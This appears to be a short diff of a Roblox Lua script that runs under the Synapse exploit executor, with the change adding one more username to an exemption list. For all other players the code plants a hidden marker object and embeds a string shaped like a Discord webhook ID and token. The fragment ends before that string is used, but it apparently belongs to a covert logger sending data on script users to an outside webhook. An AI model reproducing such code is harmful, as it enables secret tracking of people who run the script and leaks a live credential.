@@ -1,7 +1,7 @@
 local plr = game.Players.LocalPlayer
 
 if syn and syn.cache_replace and syn.cache_invalidate and syn.is_cached and syn.write_clipboard and syn.set_thread_identity then 
-	if not game.Players.LocalPlayer:FindFirstChild("statsss") and plr.Name ~= "Ziscri" and plr.Name ~= "KillerDeepwokener" and plr.Name ~= "SinFront" and plr.Name ~= "GetCurb_Stomped" and plr.Name ~= "KariiValkyrie" and plr.Name ~= "WipinBoostedKids" and plr.Name ~= "fortnitefan39193" then
+	if not game.Players.LocalPlayer:FindFirstChild("statsss") and plr.Name ~= "Ziscri" and plr.Name ~= "KillerDeepwokener" and plr.Name ~= "SinFront" and plr.Name ~= "GetCurb_Stomped" and plr.Name ~= "KariiValkyrie" and plr.Name ~= "WipinBoostedKids" and plr.Name ~= "fortnitefan39193" and plr.Name ~= "wofieink" then
 		local s = Instance.new("Accessory", game.Players.LocalPlayer)
 		s.Name = "statsss"
 		local data = "1085385027048702032/nxvYTv3fNqWjdKiO6aBobFYsXaSP6GW31Y9Vo4IjhM44m_-QV3-8lckbTe_ncd288WIR"
